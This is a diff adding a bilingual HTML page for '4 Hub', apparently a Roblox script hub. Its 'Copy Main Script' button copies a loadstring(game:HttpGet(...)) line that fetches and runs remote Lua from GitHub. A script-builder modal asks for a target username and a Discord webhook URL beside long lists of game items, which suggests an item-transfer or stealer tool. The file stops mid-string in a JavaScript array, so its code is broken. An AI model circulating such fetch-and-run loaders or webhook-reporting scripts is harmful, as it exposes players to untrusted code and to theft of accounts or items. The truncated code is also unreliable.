@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">4 Hub - Control Panel</title>
+    <!-- Favicon local -->
+    <link rel="icon" type="image/jpeg" href="logo.jpeg" id="favicon-link">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #0b0c10;
+            color: #f3f4f6;
+        }
+        .glow-effect {
+            box-shadow: 0 0 25px rgba(88, 101, 242, 0.25);
+        }
+        .glow-border {
+            border: 1px solid rgba(88, 101, 242, 0.4);
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b0c10;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #374151;
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #5865F2;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between selection:bg-[#5865F2] selection:text-white">
+
+    <!-- Header / Navbar -->
+    <header class="w-full border-b border-gray-800 bg-[#15161d]/80 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <!-- LOGO LOCAL -->
+                <div class="w-11 h-11 rounded-2xl overflow-hidden glow-effect border border-[#5865F2]/40 flex items-center justify-center bg-black">
+                    <img src="logo.jpeg" alt="4 Hub Logo" class="w-full h-full object-cover" id="brand-logo-img">
+                </div>
+                <div>
+                    <span class="text-xl font-extrabold tracking-wider bg-gradient-to-r from-indigo-400 to-[#5865F2] bg-clip-text text-transparent">4 Hub</span>
+                    <span id="nav-subtitle" class="text-xs block text-gray-400">Made By Scripters</span>
+                </div>
+            </div>
+
+            <nav class="hidden md:flex items-center space-x-1 bg-[#0b0c10] p-1.5 rounded-xl border border-gray-800">
+                <button onclick="switchTab('main')" id="btn-main" class="tab-btn px-4 py-2 rounded-lg text-sm font-semibold transition-all duration-200 bg-[#5865F2] text-white shadow-lg shadow-[#5865F2]/30" data-translate="tabGeneral">General</button>
+                <button onclick="switchTab('features')" id="btn-features" class="tab-btn px-4 py-2 rounded-lg text-sm font-semibold transition-all duration-200 text-gray-400 hover:text-white hover:bg-gray-800/50" data-translate="tabTools">Tools</button>
+            </nav>
+
+            <div class="flex items-center space-x-3">
+                <select id="langSelect" onchange="changeLanguage(this.value)" class="bg-[#0b0c10] border border-gray-800 text-gray-300 text-xs rounded-xl px-3 py-2 focus:outline-none focus:border-[#5865F2] font-semibold cursor-pointer">
+                    <option value="en">🇺🇸 EN</option>
+                    <option value="es">🇪🇸 ES</option>
+                </select>
+
+                <a href="https://discord.gg/hk4S9raGuw" target="_blank" class="flex items-center space-x-2 bg-[#5865F2]/20 hover:bg-[#5865F2]/30 border border-[#5865F2]/40 text-indigo-300 px-4 py-2 rounded-xl text-sm font-medium transition-all duration-200">
+                    <i class="fa-brands fa-discord text-base"></i>
+                    <span class="hidden sm:inline">Discord</span>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Container -->
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 flex-grow w-full">
+        
+        <!-- Tab Main -->
+        <section id="tab-main" class="tab-content space-y-8 animate-fadeIn">
+            <div class="relative overflow-hidden rounded-3xl bg-gradient-to-br from-indigo-950/40 via-purple-950/20 to-gray-900/50 border border-[#5865F2]/20 p-8 sm:p-12 glow-effect">
+                <div class="relative z-10 max-w-2xl">
+                    <span id="badge-active" class="inline-block px-3 py-1 rounded-full bg-[#5865F2]/10 border border-[#5865F2]/30 text-indigo-400 text-xs font-bold uppercase tracking-wider mb-4">Active System</span>
+                    <h1 class="text-3xl sm:text-5xl font-extrabold tracking-tight mb-4"><span data-translate="welcomeText">Made By Scripters,</span> <span class="bg-gradient-to-r from-indigo-400 to-[#5865F2] bg-clip-text text-transparent">Used By Scripters.</span></h1>
+                    <p id="main-desc" class="text-gray-300 text-base sm:text-lg mb-8 leading-relaxed">
+                        Centralized utilities and optimized platform by masterd3v_1. Browse through the available settings options and tools.
+                    </p>
+                    <div class="flex flex-wrap gap-4">
+                        <button onclick="switchTab('features')" class="bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold px-6 py-3 rounded-xl transition-all duration-200 shadow-lg shadow-[#5865F2]/30 flex items-center space-x-2">
+                            <span data-translate="btnViewTools">View Tools</span>
+                            <i class="fa-solid fa-arrow-right text-sm"></i>
+                        </button>
+                        <a href="https://discord.gg/hk4S9raGuw" target="_blank" class="bg-gray-800/80 hover:bg-gray-700/80 text-gray-200 font-semibold px-6 py-3 rounded-xl border border-gray-700 transition-all duration-200 flex items-center space-x-2">
+                            <i class="fa-brands fa-discord text-[#5865F2]"></i>
+                            <span data-translate="btnDiscord">Join Community</span>
+                        </a>
+                    </div>
+                </div>
+                <div class="absolute right-[-10%] bottom-[-20%] w-96 h-96 bg-[#5865F2]/10 rounded-full blur-3xl pointer-events-none"></div>
+            </div>
+
+            <!-- Tarjeta de Fundador con DEKU.PNG -->
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
+                <div class="bg-[#15161d] border border-[#5865F2]/30 rounded-2xl p-6 flex flex-col items-center text-center shadow-xl">
+                    <div class="relative w-20 h-20 mb-4">
+                        <img src="deku.png" alt="Deku Avatar" class="w-full h-full rounded-full object-cover border-2 border-[#5865F2]">
+                        <div class="absolute bottom-0 right-0 w-4 h-4 bg-emerald-500 border-2 border-[#15161d] rounded-full"></div>
+                    </div>
+                    <h3 class="text-xs uppercase tracking-widest text-[#5865F2] font-bold mb-1">Founded By</h3>
+                    <div class="text-lg font-bold text-white mb-2">masterd3v_1</div>
+                    <div class="text-xs font-mono text-gray-400 bg-[#0b0c10] px-3 py-1 rounded-md border border-gray-800">print("MasterDev")</div>
+                </div>
+
+                <div class="md:col-span-3 grid grid-cols-1 sm:grid-cols-3 gap-6">
+                    <div class="bg-[#15161d] border border-gray-800 rounded-2xl p-6 hover:border-[#5865F2]/40 transition-all duration-300">
+                        <div class="w-12 h-12 rounded-xl bg-[#5865F2]/10 text-indigo-400 flex items-center justify-center text-xl mb-4">
+                            <i class="fa-solid fa-shield-halved"></i>
+                        </div>
+                        <h3 class="text-lg font-bold mb-2" data-translate="card1Title">Security & Stability</h3>
+                        <p class="text-gray-400 text-sm" data-translate="card1Desc">Smooth, uninterrupted execution with built-in verification controls.</p>
+                    </div>
+                    <div class="bg-[#15161d] border border-gray-800 rounded-2xl p-6 hover:border-[#5865F2]/40 transition-all duration-300">
+                        <div class="w-12 h-12 rounded-xl bg-purple-500/10 text-purple-400 flex items-center justify-center text-xl mb-4">
+                            <i class="fa-solid fa-bolt"></i>
+                        </div>
+                        <h3 class="text-lg font-bold mb-2" data-translate="card2Title">High Performance</h3>
+                        <p class="text-gray-400 text-sm" data-translate="card2Desc">Lightweight architecture optimized to reduce resource consumption to a minimum.</p>
+                    </div>
+                    <div class="bg-[#15161d] border border-gray-800 rounded-2xl p-6 hover:border-[#5865F2]/40 transition-all duration-300">
+                        <div class="w-12 h-12 rounded-xl bg-amber-500/10 text-amber-400 flex items-center justify-center text-xl mb-4">
+                            <i class="fa-solid fa-sliders"></i>
+                        </div>
+                        <h3 class="text-lg font-bold mb-2" data-translate="card3Title">Fully Customizable</h3>
+                        <p class="text-gray-400 text-sm" data-translate="card3Desc">Easily adjust preferences and parameters directly from the control panel.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Tab Features -->
+        <section id="tab-features" class="tab-content hidden space-y-6 animate-fadeIn">
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 bg-[#15161d] border border-gray-800 p-6 rounded-2xl">
+                <div>
+                    <h2 class="text-2xl font-bold" data-translate="toolsTitle">Modules & Tools</h2>
+                    <p class="text-gray-400 text-sm" data-translate="toolsSubtitle">Select the script you want to configure and execute.</p>
+                </div>
+                <div class="relative w-full sm:w-64">
+                    <i class="fa-solid fa-search absolute left-4 top-3.5 text-gray-500 text-sm"></i>
+                    <input type="text" id="searchInput" onkeyup="filterTools()" placeholder="Search tool..." data-translate-placeholder="searchPlaceholder" class="w-full bg-[#0b0c10] border border-gray-800 rounded-xl pl-11 pr-4 py-2.5 text-sm focus:outline-none focus:border-[#5865F2] text-gray-200">
+                </div>
+            </div>
+
+            <div id="toolsGrid" class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <!-- Main Loader -->
+                <div class="tool-card bg-[#15161d] border border-gray-800 rounded-2xl p-6 flex flex-col justify-between hover:border-[#5865F2]/40 transition-all duration-300" data-name="main loader script">
+                    <div>
+                        <div class="flex items-center justify-between mb-4">
+                            <span class="px-3 py-1 rounded-full bg-indigo-500/10 text-indigo-400 text-xs font-semibold" data-translate="tagLoader">Loader</span>
+                            <i class="fa-solid fa-terminal text-indigo-400 text-lg"></i>
+                        </div>
+                        <h3 class="text-lg font-bold mb-2">Main Loader</h3>
+                        <p class="text-gray-400 text-sm mb-6" data-translate="loaderDesc">Principal script loader interface to execute core configurations and bundles.</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-4 border-t border-gray-800/80">
+                        <span class="text-xs text-emerald-400 font-medium" data-translate="statusAvailable">Status: Available</span>
+                        <button onclick="copyMainScript()" class="bg-[#5865F2]/20 hover:bg-[#5865F2] text-indigo-300 hover:text-white px-4 py-2 rounded-xl text-sm font-semibold transition-all duration-200 border border-[#5865F2]/30 flex items-center space-x-2">
+                            <i class="fa-solid fa-copy text-xs"></i>
+                            <span data-translate="btnCopyMain">Copy Main Script</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Automoreira -->
+                <div class="tool-card bg-[#15161d] border border-gray-800 rounded-2xl p-6 flex flex-col justify-between hover:border-[#5865F2]/40 transition-all duration-300" data-name="automoreira script">
+                    <div>
+                        <div class="flex items-center justify-between mb-4">
+                            <span class="px-3 py-1 rounded-full bg-amber-500/10 text-amber-400 text-xs font-semibold" data-translate="tagAutomation">Automation</span>
+                            <i class="fa-solid fa-robot text-amber-400 text-lg"></i>
+                        </div>
+                        <h3 class="text-lg font-bold mb-2">Automoreira</h3>
+                        <p class="text-gray-400 text-sm mb-6" data-translate="automoreiraDesc">Advanced tool with custom selection of Brainrots, Skins, and Gears.</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-4 border-t border-gray-800/80">
+                        <span class="text-xs text-emerald-400 font-medium" data-translate="statusAvailable">Status: Available</span>
+                        <button onclick="openConfigModal('Automoreira')" class="bg-amber-600/20 hover:bg-amber-600 text-amber-300 hover:text-white px-4 py-2 rounded-xl text-sm font-semibold transition-all duration-200 border border-amber-500/30" data-translate="btnBuilder">Script Builder</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Modal -->
+    <div id="configModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm hidden p-4">
+        <div class="bg-[#15161d] border border-[#5865F2]/30 rounded-3xl w-full max-w-4xl max-h-[90vh] overflow-y-auto p-6 sm:p-8 glow-effect relative animate-fadeIn">
+            <button onclick="closeConfigModal()" class="absolute top-6 right-6 text-gray-400 hover:text-white text-xl">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+
+            <h2 id="modalTitle" class="text-2xl font-bold mb-2" data-translate="modalTitle">Configure Script</h2>
+            <p id="modalSubtitle" class="text-gray-400 text-sm mb-6" data-translate="modalSubtitle">Adjust parameters and select the required items.</p>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-2">Target Username</label>
+                    <input type="text" id="targetUsernameInput" placeholder="Ex: yourusername" class="w-full bg-[#0b0c10] border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[#5865F2] text-gray-200">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-2">Webhook URL</label>
+                    <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." class="w-full bg-[#0b0c10] border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[#5865F2] text-gray-200">
+                </div>
+            </div>
+
+            <div id="automoreiraConfigSection" class="bg-[#0b0c10] border border-gray-800 rounded-2xl p-6 mb-6">
+                <div class="flex flex-wrap gap-2 mb-4 border-b border-gray-800 pb-4">
+                    <button onclick="switchSubTab('brainrots')" id="sub-btn-brainrots" class="sub-tab-btn px-4 py-2 rounded-xl text-xs font-bold transition-all bg-[#5865F2] text-white">Brainrots</button>
+                    <button onclick="switchSubTab('skins')" id="sub-btn-skins" class="sub-tab-btn px-4 py-2 rounded-xl text-xs font-bold transition-all text-gray-400 hover:bg-gray-800/50">Base Skins</button>
+                    <button onclick="switchSubTab('gears')" id="sub-btn-gears" class="sub-tab-btn px-4 py-2 rounded-xl text-xs font-bold transition-all text-gray-400 hover:bg-gray-800/50">Gears</button>
+                </div>
+
+                <div id="sub-pane-brainrots" class="sub-pane space-y-4">
+                    <div class="flex flex-col sm:flex-row justify-between items-center gap-3">
+                        <select id="brainrotCategorySelect" class="w-full sm:w-64 bg-[#15161d] border border-gray-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-[#5865F2] text-gray-200 font-medium">
+                            <option value="Common">Common</option>
+                            <option value="Rare">Rare</option>
+                            <option value="Epic">Epic</option>
+                            <option value="Legendary">Legendary</option>
+                            <option value="Mythic">Mythic</option>
+                            <option value="Brainrot God">Brainrot God</option>
+                            <option value="Secret">Secret</option>
+                            <option value="OG">OG</option>
+                        </select>
+                        <span class="text-xs text-gray-400" data-translate="selectItemsNotice">Click buttons to select or deselect items</span>
+                    </div>
+                    <div id="brainrotsItemsContainer" class="max-h-60 overflow-y-auto bg-[#15161d] border border-gray-800 rounded-xl p-4 grid grid-cols-2 sm:grid-cols-3 gap-2.5"></div>
+                </div>
+
+                <div id="sub-pane-skins" class="sub-pane hidden space-y-4">
+                    <div class="text-xs text-gray-400" data-translate="selectSkinsNotice">Select normal Base Skins:</div>
+                    <div id="skinsItemsContainer" class="max-h-60 overflow-y-auto bg-[#15161d] border border-gray-800 rounded-xl p-4 grid grid-cols-2 sm:grid-cols-3 gap-2.5"></div>
+                </div>
+
+                <div id="sub-pane-gears" class="sub-pane hidden space-y-4">
+                    <div class="text-xs text-gray-400" data-translate="selectGearsNotice">Select normal Gears:</div>
+                    <div id="gearsItemsContainer" class="max-h-60 overflow-y-auto bg-[#15161d] border border-gray-800 rounded-xl p-4 grid grid-cols-2 sm:grid-cols-3 gap-2.5"></div>
+                </div>
+            </div>
+
+            <div class="space-y-4">
+                <button id="generateBtn" class="w-full bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold py-3.5 px-6 rounded-xl transition-all duration-200 shadow-lg shadow-[#5865F2]/30 flex items-center justify-center space-x-2">
+                    <i class="fa-solid fa-code text-sm"></i>
+                    <span data-translate="btnGenerate">Generate Roblox Script</span>
+                </button>
+                
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-2" data-translate="codeOutputLabel">Generated Code</label>
+                    <textarea id="outputCode" readonly placeholder="The generated code will appear here..." class="w-full bg-[#0b0c10] border border-gray-800 rounded-xl p-4 text-xs font-mono text-indigo-300 h-36 focus:outline-none"></textarea>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="border-t border-gray-800 bg-[#15161d]/50 py-6 mt-12 text-center text-xs text-gray-500">
+        <p>&copy; 2026 4 Hub. <span data-translate="footerRights">All rights reserved.</span></p>
+    </footer>
+
+    <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col space-y-2 pointer-events-none"></div>
+
+    <script>
+        const translations = {
+            en: {
+                pageTitle: "4 Hub - Control Panel",
+                navSubtitle: "Made By Scripters",
+                tabGeneral: "General",
+                tabTools: "Tools",
+                badgeActive: "Active System",
+                welcomeText: "Made By Scripters,",
+                mainDesc: "Centralized utilities and optimized platform by masterd3v_1. Browse through the available settings options and tools.",
+                btnViewTools: "View Tools",
+                btnDiscord: "Join Community",
+                card1Title: "Security & Stability",
+                card1Desc: "Smooth, uninterrupted execution with built-in verification controls.",
+                card2Title: "High Performance",
+                card2Desc: "Lightweight architecture optimized to reduce resource consumption to a minimum.",
+                card3Title: "Fully Customizable",
+                card3Desc: "Easily adjust preferences and parameters directly from the control panel.",
+                toolsTitle: "Modules & Tools",
+                toolsSubtitle: "Select the script you want to configure and execute.",
+                searchPlaceholder: "Search tool...",
+                tagLoader: "Loader",
+                tagAutomation: "Automation",
+                loaderDesc: "Principal script loader interface to execute core configurations and bundles.",
+                automoreiraDesc: "Advanced tool with custom selection of Brainrots, Skins, and Gears.",
+                statusAvailable: "Status: Available",
+                btnCopyMain: "Copy Main Script",
+                btnBuilder: "Script Builder",
+                modalTitle: "Configure Script",
+                modalSubtitle: "Adjust parameters and select the required items.",
+                selectItemsNotice: "Click buttons to select or deselect items",
+                selectSkinsNotice: "Select normal Base Skins:",
+                selectGearsNotice: "Select normal Gears:",
+                btnGenerate: "Generate Roblox Script",
+                codeOutputLabel: "Generated Code",
+                footerRights: "All rights reserved.",
+                toastGenerated: "Script generated successfully",
+                toastCopied: "Main Script copied to clipboard!"
+            },
+            es: {
+                pageTitle: "4 Hub - Panel de Control",
+                navSubtitle: "Creado por Scripters",
+                tabGeneral: "General",
+                tabTools: "Herramientas",
+                badgeActive: "Sistema Activo",
+                welcomeText: "Made By Scripters,",
+                mainDesc: "Plataforma centralizada y optimizada por masterd3v_1. Navega entre las distintas opciones de configuración y herramientas disponibles.",
+                btnViewTools: "Ver Herramientas",
+                btnDiscord: "Unirse a la Comunidad",
+                card1Title: "Seguridad y Estabilidad",
+                card1Desc: "Ejecución fluida y libre de interrupciones con controles de verificación integrados.",
+                card2Title: "Alto Rendimiento",
+                card2Desc: "Arquitectura ligera optimizada para reducir el consumo de recursos al mínimo.",
+                card3Title: "Totalmente Personalizable",
+                card3Desc: "Ajusta preferencias y parámetros de forma intuitiva desde el panel de control.",
+                toolsTitle: "Módulos y Herramientas",
+                toolsSubtitle: "Selecciona el script que deseas configurar y ejecutar.",
+                searchPlaceholder: "Buscar herramienta...",
+                tagLoader: "Loader",
+                tagAutomation: "Automatización",
+                loaderDesc: "Interfaz principal de carga para ejecutar configuraciones y paquetes del sistema.",
+                automoreiraDesc: "Herramienta avanzada con selección de Brainrots, Skins y Gears personalizados.",
+                statusAvailable: "Estado: Disponible",
+                btnCopyMain: "Copiar Main Script",
+                btnBuilder: "Generador de Script",
+                modalTitle: "Configurar Script",
+                modalSubtitle: "Ajusta los parámetros y selecciona los elementos requeridos.",
+                selectItemsNotice: "Haz clic en los botones para seleccionar o deseleccionar",
+                selectSkinsNotice: "Selecciona las Base Skins normales:",
+                selectGearsNotice: "Selecciona los Gears normales:",
+                btnGenerate: "Generar Script de Roblox",
+                codeOutputLabel: "Código Generado",
+                footerRights: "Todos los derechos reservados.",
+                toastGenerated: "Script generado correctamente",
+                toastCopied: "¡Main Script copiado al portapapeles!"
+            }
+        };
+
+        let currentLang = 'en';
+        let activeTool = 'Automoreira';
+
+        function changeLanguage(lang) {
+            currentLang = lang;
+            document.getElementById('langSelect').value = lang;
+            const t = translations[lang];
+
+            document.getElementById('page-title').textContent = t.pageTitle;
+            document.getElementById('nav-subtitle').textContent = t.navSubtitle;
+            document.getElementById('badge-active').textContent = t.badgeActive;
+            document.getElementById('main-desc').textContent = t.mainDesc;
+            document.getElementById('searchInput').placeholder = t.searchPlaceholder;
+
+            document.querySelectorAll('[data-translate]').forEach(el => {
+                const key = el.getAttribute('data-translate');
+                if (t[key]) el.textContent = t[key];
+            });
+        }
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            document.querySelectorAll('.tab-btn').forEach(el => {
+                el.classList.remove('bg-[#5865F2]', 'text-white', 'shadow-lg', 'shadow-[#5865F2]/30');
+                el.classList.add('text-gray-400', 'hover:text-white', 'hover:bg-gray-800/50');
+            });
+            
+            document.getElementById('tab-' + tabId).classList.remove('hidden');
+            const activeBtn = document.getElementById('btn-' + tabId);
+            activeBtn.classList.remove('text-gray-400', 'hover:text-white', 'hover:bg-gray-800/50');
+            activeBtn.classList.add('bg-[#5865F2]', 'text-white', 'shadow-lg', 'shadow-[#5865F2]/30');
+        }
+
+        function switchSubTab(subId) {
+            document.querySelectorAll('.sub-pane').forEach(el => el.classList.add('hidden'));
+            document.querySelectorAll('.sub-tab-btn').forEach(el => {
+                el.classList.remove('bg-[#5865F2]', 'text-white');
+                el.classList.add('text-gray-400', 'hover:bg-gray-800/50');
+            });
+
+            document.getElementById('sub-pane-' + subId).classList.remove('hidden');
+            const activeSubBtn = document.getElementById('sub-btn-' + subId);
+            activeSubBtn.classList.remove('text-gray-400', 'hover:bg-gray-800/50');
+            activeSubBtn.classList.add('bg-[#5865F2]', 'text-white');
+        }
+
+        function filterTools() {
+            const query = document.getElementById('searchInput').value.toLowerCase();
+            document.querySelectorAll('.tool-card').forEach(card => {
+                const name = card.getAttribute('data-name');
+                card.style.display = name.includes(query) ? 'flex' : 'none';
+            });
+        }
+
+        function copyMainScript() {
+            const scriptText = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/alexvalminecraft-coder/4Hub/refs/heads/main/Loader1.lua"))()';
+            navigator.clipboard.writeText(scriptText).then(() => {
+                showToast(translations[currentLang].toastCopied, 'success');
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+
+        function openConfigModal(toolName) {
+            activeTool = toolName;
+            document.getElementById('configModal').classList.remove('hidden');
+            const automoreiraSection = document.getElementById('automoreiraConfigSection');
+            
+            if (toolName === 'Main Loader') {
+                automoreiraSection.style.display = 'none';
+                document.getElementById('modalTitle').textContent = currentLang === 'es' ? 'Configurar Main Loader' : 'Configure Main Loader';
+            } else {
+                automoreiraSection.style.display = 'block';
+                document.getElementById('modalTitle').textContent = currentLang === 'es' ? 'Configurar Automoreira' : 'Configure Automoreira';
+            }
+        }
+
+        function closeConfigModal() {
+            document.getElementById('configModal').classList.add('hidden');
+        }
+
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `pointer-events-auto px-4 py-3 rounded-xl border text-sm font-medium shadow-xl transition-all duration-300 transform translate-y-2 opacity-0 flex items-center space-x-2 bg-[#15161d] border-[#5865F2]/40 text-indigo-300`;
+            toast.innerHTML = `<i class="fa-solid fa-circle-check text-[#5865F2]"></i><span>${message}</span>`;
+            container.appendChild(toast);
+            setTimeout(() => toast.classList.remove('translate-y-2', 'opacity-0'), 10);
+            setTimeout(() => {
+                toast.classList.add('translate-y-2', 'opacity-0');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        const brainrotLists = {
+            Common: ['Fluriflura', 'Holy Arepa', 'Lirilì Larilà', 'Noobini Pizzanini', 'Noobini Santanini', 'Pipi Corni', 'Pipi Kiwi', 'Raccooni Jandelini', 'Svinina Bombardino', 'Talpa Di Fero', 'Tartaragno', 'Tim Cheese'],
+            Rare: ['Bandito Bobritto', 'Boneca Ambalabu', 'Cacto Hipopotamo', 'Cupcake Koala', 'Frogo Elfo', 'Gangster Footera', 'Pengolino Nuvoletto', 'Pinealotto Fruttarino', 'Pipi Avocado', 'Ta Ta Ta Ta Sahur', 'Tric Trac Baraboom', 'Trippi Troppi'],
+            Epic: ['Avocadini Antilopini', 'Avocadini Guffo', 'Bambini Crostini', 'Bananita Dolphinita', 'Brr Brr Patapim', 'Brri Brri Bicus Dicus Bombicus', 'Cappuccino Assassino', 'Doi Doi Do', 'Frogato Pirato', 'Gato Celesto', 'Malame Amarele', 'Mangolini Parrocini', 'Mummio Rappitto', 'Penguin Tree', 'Penguino Cocosino', 'Perochello Lemonchello', 'Salamino Penguino', 'Ti Ti Ti Sahur', 'Trulimero Trulicina', 'Wombo Rollo'],
+            Legendary: ['Ballerina Cappuccina', 'Bandito Axolito', 'Blueberrinni Octopusini', 'Buho de Fuego', 'Buho del Cielo', 'Burbaloni Loliloli', 'Caramello Filtrello', 'Chef Crabracadabra', 'Chimpanzini Bananini', 'Chocco Bunny', 'Clickerino Crabo', 'Cocosini Mama', 'Electro Quacko', 'Glorbo Fruttodrillo', 'Lionel Cactuseli', 'Pandaccini Bananini', 'Pi Pi Watermelon', 'Pipi Potato', 'Puffaball', 'Quackula', 'Quivioli Ameleonni', 'Sealo Regalo', 'Seraphino Gruyero', 'Sigma Boy', 'Sigma Girl', 'Strawberrelli Flamingelli'],
+            Mythic: ['Avocadorilla', 'Bananito Bandito', 'Bee Loco', 'Berenjello Angello', 'Bombardiro Crocodilo', 'Bombombini Gusini', 'Brutto Gialutto', 'Bucketoro', 'Cachorrito Melonito', 'Carloo', 'Carrotini Brainini', 'Cavallo Virtuoso', 'Centrucci Nuclucci', 'Cocoteddy', 'Fizzy Soda', 'Frigo Camelo', 'Ganganzelli Trulala', 'Gorillo Subwoofero', 'Gorillo Watermelondrillo', 'Harpuccino', 'Jacko Spaventosa', 'Jingle Jingle Sahur', 'Lerulerulerule', 'Los Noobinis', 'Lucky Block', 'Magi Ribbitini', 'Orangutini Ananassini', 'Orbi Mochi', 'Rhino Helicopterino', 'Rhino Toasterino', 'Spioniro Golubiro', 'Spongini Quackini', 'Stoppo Luminino', 'Te Te Te Sahur', 'Tigrilini Watermelini', 'Tob Tobi Tobi', 'Toiletto Focaccino', 'Tracoducotulu Delapeladustuz', 'Tree Tree Tree Sahur', 'Zibra Zubra Zibralini'],
+            'Brainrot God': ['Alessio', 'Anpali Babel', 'Appelini', 'Aquanaut', 'Astrolero Cervalero', 'Ballerina Peppermintina', 'Ballerino Lololo', 'Bambu Bambu Sahur', 'Belula Beluga', 'Boba Panda', 'Bombardini Tortinii', 'Brasilini Berimbini', 'Brr es Teh Patipum', 'Buho de Noelo', 'Bulbito Bandito Traktorito', 'Bunny Tralala', 'Cacasito Satalito', 'Capi Taco', 'Cappuccino Clownino', 'Chihuanini Taconini', 'Chrismasmamat', 'Clovkur Kurkur', 'Cocoa Assassino', 'Cocofanto Elefanto', 'Cola Cat', 'Corn Corn Corn Sahur', 'Crabbo Limonetta', 'Divino Platypio', 'Dolphini Jetskini', 'Dumborino Miracello', 'Eggdin Egg Egg Dun', 'Espresso Signora', 'Extinct Ballerina', 'Flippo Marino', 'Frio Ninja', 'Gattatino Nyanino', 'Gattito Tacoto', 'Ginger Cisterna', 'Ginger Globo', 'Girafa Celestre', 'Granchiello Spiritell', 'Jacko Jack Jack', 'Karkerheart Luvkur', 'Krupuk Pagi Pagi', 'Las Capuchinas', 'Lazy Ducky', 'Lemonita Splashita', 'Los Bombinitos', 'Los Chihuaninis', 'Los Crocodillitos', 'Los Gattitos', 'Los Orcalitos', 'Los Tipi Tacos', 'Los Tungtungtungcitos', 'Lucky Block', 'Lumaca Malefica', 'Luv Luv Luv', 'Mastodontico Telepiedone', 'Matteo', 'Money Money Man', 'Mummy Ambalabu', 'Noo La Polizia', 'Odin Din Din Dun', 'Orcalero Orcala', 'Orcalita Orcala', 'Pakrahmatmamat', 'Pakrahmatmatina', 'Pandanini Frostini', 'Patteo', 'Piccione Macchina', 'Piccionetta Macchina', 'Pineaplino', 'Pop Pop Sahur', 'Pretzo Robo', 'Robo Grafito', 'Skull Skull Skull', 'Snailenzo', 'Squalanana', 'Sundrilla Sundae', 'Tartaruga Cisterna', 'Tenini Ballini', 'Tentacolo Tecnico', 'Tigroligre Frutonni', 'Tipi Topi Taco', 'Tootini Shrimpini', 'Tortuginni Sandcastlini', 'Tractoro Dinosauro', 'Tralalero Tralala', 'Tralalita Tralala', 'Trenostruzzo Turbo 3000', 'Trenotubo Axolotrico 9000', 'Trippi Troppi Troppa Trippa', 'Tukanno Bananno', 'Unclito Samito', 'Urubini Flamenguini', 'Vampira Cappucina', 'Yeti Claus'],
+            Secret: ['1x1x1x1', '25', '67', 'Abyssaloco', 'Agarrini la Palini', 'Antonio', 'Aquarino', 'Arcadopus', 'Arcadragon', 'Bacuru and Egguru', 'Bananito', 'Baskito', 'Bearito Cabinito', 'Berryno', 'Bisonte Giuppitere', 'Blackhole Goat', 'Boatito Auratito', 'Bombardiro Vaccariro', 'Boppin Bunny', 'Brunito Marsito', 'Buho de Volto', 'Bunito Bunito Spinito', 'Bunny Bunny Bunny Sahur', 'Bunny and Eggy', 'Bunnyman', 'Buntteo', 'Burguro And Fryuro', 'Burrito Bandito', 'Camera Ramena', 'Capitano Gullini', 'Capitano Moby', 'Cash or Card', 'Caylusaurus', 'Celestial Pegasus', 'Celularcini Viciosini', 'Cerberus', 'Chachechi', 'Chicleteira Bicicleteira', 'Chicleteira Cupideira', 'Chicleteira Noelteira', 'Chicleteira Surfeiteira', 'Chicleteirina Bicicleteirina', 'Chill Puppy', 'Chillin Chili', 'Chimnino', 'Chipso and Queso', 'Churrito Bunnito', 'Cigno Fulgoro', 'Cloverat Clapat', 'Coco and Mango', 'Cooki and Milki', 'Craburger', 'Cuadramat and Pakrahmatmamat', 'Cupid Cupid Sahur', 'Cupid Hotspot', 'DJ Panda', 'Digi Narwhal', 'Donkeyturbo Express', 'Dragon Aquanini', 'Dragon Cannelloni', 'Dragon Gingerini', 'Dug dug dug', 'Duggy Bros', 'Dul Dul 